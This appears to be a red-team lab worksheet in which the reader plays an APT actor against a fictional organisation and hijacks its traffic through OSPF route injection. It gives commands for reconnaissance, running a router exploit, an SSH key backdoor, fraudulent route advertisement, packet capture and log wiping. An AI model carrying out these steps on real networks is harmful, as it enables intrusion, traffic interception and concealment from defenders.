# The Indirect Intercept

Objective: Act as an APT actor (`APT-47`) to compromise a network router, manipulate routing to redirect traffic, and intercept unencrypted sensitive data. Document your findings at each step.

Scenario: [OpenHands International](entity.md) uses a dynamic routing protocol to connect its HQ and remote offices. Your goal is to perform a Machine-in-the-Middle (MitM) attack by hijacking this traffic flow.

## Phase 1: Reconnaissance & Mapping

Goal: Discover the network topology and identify key targets.

Instructions:

1.  Access Your Foothold:
    *   SSH into your assigned low-privilege user account on the workstation VM.
    *   Command: `ssh volunteer@<workstation_ip>`
    *   Password: `[Provided by Lab Instructor]`

2.  Map the Local Network:
    *   Find your own IP address and the default gateway.
    *   Command: `ip addr show` and `ip route show default`
    *   Your IP: `[DISCOVER THIS]`
    *   Default Gateway: `[DISCOVER THIS]` - This is your first key target. Note it as `TARGET_ROUTER`.

3.  Discover Live Hosts:
    *   Perform a stealthy ping sweep of your local subnet to find other devices.
    *   Command: `nmap -sn -T4 <your_subnet>/24` (e.g., if your IP is `192.168.1.10`, the subnet is `192.168.1.0/24`)
    *   Finding: List 3 active IP addresses you discover, excluding yourself and the gateway.

4.  Probe for Services:
    *   Perform a port scan on the `TARGET_ROUTER` to identify running services. Focus on finding the routing protocol port.
    *   Command: `nmap -sS -p- -T4 <TARGET_ROUTER_IP>`
    *   Critical Finding: What port is open that is commonly associated with a routing protocol? (e.g., `2601/tcp`, `2604/tcp`, `179/tcp`).
    *   Service: `[DISCOVER THIS]`

5.  Confirm Routing Protocol:
    *   Use a packet sniffer to listen for multicast packets that reveal the routing protocol in use.
    *   Command: `sudo tcpdump -i any -n host 224.0.0.5 or host 224.0.0.6 -c 5`
    *   Finding: What is the name of the routing protocol you observed? (e.g., OSPF, EIGRP).
    *   Protocol: `[DISCOVER THIS]`

Checkpoint: You have now identified the local router and the dynamic routing protocol it uses. Proceed to the next phase.

## Phase 2: Gaining Control of the Router

Goal: Exploit a vulnerability on the router to gain privileged access.

Instructions:

1.  Research the Target:
    *   From your workstation, try to identify the make and model of the `TARGET_ROUTER`.
    *   Command: `nmap -sV -p <routing_port> <TARGET_ROUTER_IP>`
    *   Finding: What software and version is running the routing service? (e.g., `FRRouting 8.1`, `Bird 2.0.7`).
    *   Version: `[DISCOVER THIS]`

2.  Locate the Exploit:
    *   Your lab instructor has provided a directory of proof-of-concept (PoC) exploits. Navigate to it.
    *   Command: `cd /opt/pocs/`
    *   Find the exploit script that matches the software version you discovered.
    *   Exploit Script: `[DISCOVER THIS]` (e.g., `router_rce_cve_2023_xxxx.py`)

3.  Execute the Exploit:
    *   Run the exploit script against the `TARGET_ROUTER` to gain a remote shell.
    *   Command: `python3 <exploit_script_name.py> <TARGET_ROUTER_IP>`
    *   Success: Your terminal should now show a command prompt for the router (e.g., `vyos@router:~$`).

4.  Secure Your Access (Persistence):
    *   You have a shell, but it might be unstable. Establish reliable backdoor access via SSH.
    *   Action: Append your public SSH key to the router's `authorized_keys` file.
    *   Command: `echo "ssh-rsa AAAAB3NzaC1yc2E... student@workstation" >> /home/vyos/.ssh/authorized_keys`
    *   Verify: Exit the shell and SSH back into the router directly using your key.
    *   Command: `ssh vyos@<TARGET_ROUTER_IP>`

Checkpoint: You now have persistent, privileged access to the network router. You are now in control of a critical network device.

## Phase 3: Traffic Redirection via Route Manipulation

Goal: Abuse your control of the router to redirect traffic for interception.

Instructions:

1.  Analyse the Current Routing Topology:
    *   On the compromised router, view the routing table and the routing protocol's database.
    *   Commands: `show ip route` and `show ip ospf database` (or equivalent for the protocol you found).
    *   Finding: What is the network prefix of the REMOTE_OFFICE subnet? (e.g., `192.168.5.0/24`).
    *   REMOTE_NET: `[DISCOVER THIS]`

2.  Identify the Path:
    *   Note the current path and cost (metric) for the route to `REMOTE_NET`.

3.  Advertise a Fraudulent Route:
    *   Configure the router to advertise a fake, more attractive route to the `REMOTE_NET`.
    *   This requires entering configuration mode on your router platform.
*   Example Commands (VyOS/FRR):

```bash
configure terminal
router ospf
redistribute static metric-type 1 metric 10
exit
ip route <REMOTE_NET> <null_interface_or_fake_next_hop> # This creates a static route that will be redistributed
commit
save
exit
```

  *   This tells other routers: "Send all traffic for `REMOTE_NET` to me, and I can get there with a fantastic metric of 10."

4.  Verify the Attack Worked:
    *   Wait 60 seconds for the routing protocol to converge.
    *   From your original workstation, trace the route to a host in the `REMOTE_NET`.
    *   Command: `traceroute <IP_ADDRESS_IN_REMOTE_NET>`
    *   Finding: Is the first hop your `TARGET_ROUTER`? (It should be).
    *   Result: `[YES/NO]`

Checkpoint: You have successfully poisoned the routing table. All traffic from your segment to the remote office now flows through your compromised router.

## Phase 4: Interception and Exfiltration

Goal: Capture unencrypted traffic containing simulated sensitive data.

Instructions:

1.  Sniff the Redirected Traffic:
    *   On the compromised router, start a packet capture on the interface facing the HQ LAN.
    *   Command: `sudo tcpdump -i eth0 -w captured_traffic.pcap host <IP_ADDRESS_IN_REMOTE_NET>`
    *   Let this run for 5 minutes to capture traffic.

2.  Trigger Data Generation (Optional):
    *   Inform your lab instructor. They may run a script that generates simulated unencrypted HTTP traffic containing "sensitive" dummy data (e.g., volunteer records) from HQ to the remote office.

3.  Analyse the Capture:
    *   Transfer the `.pcap` file to your workstation for analysis with Wireshark.
    *   Command (from your workstation): `scp vyos@<TARGET_ROUTER_IP>:captured_traffic.pcap .`
    *   Open the file in Wireshark: `wireshark captured_traffic.pcap`
    *   Finding: Apply a filter for `http`. Can you find any HTTP POST requests? If so, examine the packet details to find the simulated exfiltrated data.
    *   Exfiltrated Data: `[COPY THE DUMMY DATA STRING YOU FIND]`

Checkpoint: You have successfully intercepted and exfiltrated sensitive data by manipulating network infrastructure.

## Phase 5: Covering Tracks (Optional Bonus)

Goal: Remove evidence of your presence on the router.

Instructions:

1.  Remove the Fraudulent Route: Log back into the router and remove the static redistribution configuration.
2.  Remove Persistence: Delete your public key from the `authorized_keys` file.
3.  Clear Logs: Find the router's log file (e.g., `/var/log/messages`) and remove any entries containing your workstation's IP address. Note: This is often difficult to do completely on network devices.

Final Report: Document all the `[DISCOVER THIS]` fields and write a short paragraph explaining the impact of this attack on a real organisation like OpenHands International.
